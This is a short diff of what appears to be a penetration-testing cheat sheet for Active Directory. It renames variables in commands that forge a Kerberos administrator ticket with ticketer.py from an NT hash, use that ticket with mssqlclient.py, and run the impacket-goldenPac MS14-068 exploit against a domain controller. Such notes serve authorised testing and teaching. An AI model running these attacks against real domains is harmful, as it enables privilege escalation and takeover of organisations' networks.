@@ -147,7 +147,7 @@ get-addomain
 ```
 
 ```shell
-ticketer.py -nthash $HASH -domainsid $DOMAINSID -domain $DOMAIN -spn AnyName/$DCDOMAIN administrator
+ticketer.py -nthash $HASH -domainsid $DOMAINSID -domain $TARGET_AD -spn AnyName/dc.$TARGET_AD administrator
 ```
 
 ```shell
@@ -157,7 +157,7 @@ KRB5CCNAME=administrator.ccache mssqlclient.py -k administrator@$DCDOMAIN
 GoldenPAC ms14-068
 
 ```bash
-impacket-goldenPac -dc-ip $TARGET_IP -target-ip $TARGET_IP '$DOMAIN/$USER:$PASSWORD@$MACHINE.$DOMAIN'
+impacket-goldenPac -dc-ip $TARGET_IP -target-ip $TARGET_IP '$TARGET_AD/$USER:$PASSWORD@$MACHINE.$TARGET_AD'
 ```
 
 Port scanning using PowerShell
